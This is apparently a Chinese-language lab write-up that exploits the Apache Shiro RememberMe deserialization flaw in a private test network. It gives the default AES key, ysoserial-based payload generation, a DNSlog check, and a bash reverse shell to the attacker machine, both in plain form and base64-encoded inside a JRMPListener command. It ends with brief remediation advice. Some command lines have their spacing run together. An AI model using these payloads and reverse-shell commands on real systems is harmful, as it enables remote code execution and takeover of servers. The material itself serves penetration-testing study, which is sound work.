0x01环境介绍


  

攻击机：192.168.60.129 (kali)

受害机：192.168.60.151

网关：192.168.60.2

工具：docker、burp、python3

Apache Shiro:

Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。

0x03前攻击阶段


 

通过使用burp抓包获取RememberMe字段

解密RememberMe字段获取AES密钥（公开AES密钥）

kPH+bIxk5D2deZiIxcaaaA==

Payload生成脚本是基于python3环境运行的，(我在安装的时候遇到了很多坑，最终坚持不懈查阅资料解决了问题）

安装模块时要使用pip3 install 模块名

其中有一个模块特别要强调，就是安装pycrypto，用来解决报错No module named Crypto.Cipher（注意看报错信息）

需要ysoserial工具的jar文件

依次执行以下命令（jar的文件名要和脚本中的一样，文件要和脚本在同一目录下）

git clonehttps://github.com/frohoff/ysoserial.gitcd ysoserialmvn package-DskipTests     #mvn也需要自行安装

注：jar的文件名和脚本中的需要一样，文件要和脚本在同一目录下,且攻击机需要安装Java运行环境JDK还需配置环境变量。

接下来运行脚本生成payload

python3 shiro.py"ping 4xlw6y.dnslog.cn

使用dnglog检测命令是否执行成功

http://www.dnslog.cn/

将生成的payload通过burp重放到服务器进行执行

发现命令执行成功，有DNS解析

接下来通过命令执行漏洞getshell

生成Poc

python3 poc.py192.168.60.129:7777

使用burp重放生成的poc代码

制作反弹shell代码

bash -i >&/dev/tcp/192.168.60.129/9999 0>&1

然后进行Java反序列化绕过 base64编码

在线工具

http://www.jackson-t.ca/runtime-exec-payloads.html


在攻击服务器使用ysoserial中JRMP监听模块，监听7777端口，注意这里的端口是刚才生成rememberMe值的端口，再加上生成的代码

发现反弹连接

java -cpysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 7777CommonsCollections5 'bash -c{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYwLjEyOS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}'

使用nc监听，由于比较慢执行到此。



0x04修复建议


  

1、升级Shiro到1.2.5及以上。

2、如果在使用过程中配置了默认的AES密钥，建议生成随机AES密钥使用。
